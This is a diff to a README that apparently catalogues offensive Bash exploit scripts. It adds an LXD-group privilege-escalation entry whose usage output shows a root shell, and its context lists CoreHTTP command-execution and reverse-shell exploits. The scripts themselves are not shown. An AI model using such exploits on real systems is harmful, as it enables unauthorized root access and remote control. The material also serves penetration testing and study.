@@ -21,6 +21,18 @@ for f in $files; do cp "$f" /usr/local/bin/"${f%.sh}"; done
 ```
 ![CVE-2006-3392](https://raw.githubusercontent.com/tobor88/Bash/master/cve20063392.png)
 
+- __LXD Privilege Escalation__ This exploit can be used to escalate privileges in a Linux environment where the user is a member of the lxd group. 
+```bash
+# Example Usage:
+./lxd_privesc.sh container01
+# RESULTS
+Device rootdisk added to container01
+Device rootdisk removed from container01
+[*] Execution completed
+uid=0(root) gid=0(root) groups=0(root)
+root@example:/dev/shm/.tobor# exit
+```
+
 - __CoreHTTP 0.5.3.1 - 'CGI' Arbitrary Command Execution__ This exploit is used to obtain a reverse shell from a remote server hosting a CoreHTTP instance version 0.5.3.1 or lower. CoreHTTP server fails to properly sanitize input before calling the popen() function in http.c. Define a reverse shell to execute. I have a common list on my site [Reverse Shells Here](https://roberthosborne.com/reverse-shells)
 ```bash
 # Example Usage:
